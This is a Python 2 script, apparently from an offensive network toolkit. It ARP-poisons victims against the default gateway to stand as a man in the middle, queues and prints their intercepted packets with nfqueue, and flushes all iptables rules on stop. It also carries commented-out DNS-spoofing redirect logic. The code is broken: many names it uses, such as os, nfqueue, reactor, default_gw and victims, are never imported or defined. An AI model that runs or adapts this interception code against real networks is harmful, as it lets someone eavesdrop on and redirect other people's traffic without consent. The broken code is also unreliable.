#!/usr/bin/python
# Filename: find_subnets.py

'''

This module is useful to find reachable subnets around.
The attack consist of standing as Man In The Middle for a short time and then 
detect private subnets in the source or destination ip packets.

'''

import sys
import netifaces
import netaddr
import threading

import arp_spoof
import scans


def start_find_subnets():
    print scans.ip_victims
    print scans.mac_victims
    for ip, mac in zip(scans.ip_victims, scans.mac_victims):
            threading.Thread(target=arp_spoof.arp_poison,args=(default_gw, ip, gw_mac_address, mac)).start()
    #os.system('iptables -t nat -A PREROUTING -j NFQUEUE')
    #Queued()
        #rctr = threading.Thread(target=reactor.run, args=(False,))
        #rctr.daemon = True
        #rctr.start()

def stop_find_subnets():
    arp_spoof.stop_arp_poisoning()
    print '\033[32mSending ARP packets to restore original MAC addresses:\033[37m'
    for ip, mac in zip(victims, victims_mac):
        gw_mac_address = origin_mac(default_gw)
        restore(default_gw, ip, gw_mac_address, mac)
    print ''
    print '\033[32mClearing iptables ...\033[37m'
    os.system('/sbin/iptables -F')
    os.system('/sbin/iptables -X')
    os.system('/sbin/iptables -t nat -F')
    os.system('/sbin/iptables -t nat -X')


def cb(junk, payload):
        # put the payload in 'data'
        data = payload.get_data()
        # put IP packet content in 'pkt'
        pkt = IP(data)
        print pkt
        print ''
        # if no DNSQR layer (DNS query)
        #if not pkt.haslayer(DNSQR):
    # Let the packet pass
        payload.set_verdict(nfqueue.NF_ACCEPT)
        #else:
        #    if arg_parser().spoofall:
        #        if not arg_parser().redirectto:
        #            spoofed_pkt(payload, pkt, local_ip)
        #        else:
        #            spoofed_pkt(payload, pkt, arg_parser().redirectto)
        #    if arg_parser().domain:
            # if option '-d' is in field (pkt[DNS].qd.qname) 
        #        if arg_parser().domain in pkt[DNS].qd.qname:
        #            if not arg_parser().redirectto:
        #                spoofed_pkt(payload, pkt, local_ip)
        #            else:
        #                spoofed_pkt(payload, pkt, arg_parser().redirectto)


class Queued(object):
        def __init__(self):
    # On met dans self.q les paquets present dans la file d'attente
                self.q = nfqueue.queue()
                self.q.set_callback(cb)
    # On cree la socket et on la bind avec la file d'attente 0
                self.q.fast_open(0, socket.AF_INET)
                self.q.set_queue_maxlen(5000)
                reactor.addReader(self)
                self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
                print '\033[31m[*] Start finding subnets around ...\033[37m'
        def fileno(self):
                return self.q.get_fd()
        def doRead(self):
                self.q.process_pending(100)
        def connectionLost(self, reason):
                reactor.removeReader(self)
        def logPrefix(self):
                return 'queue'

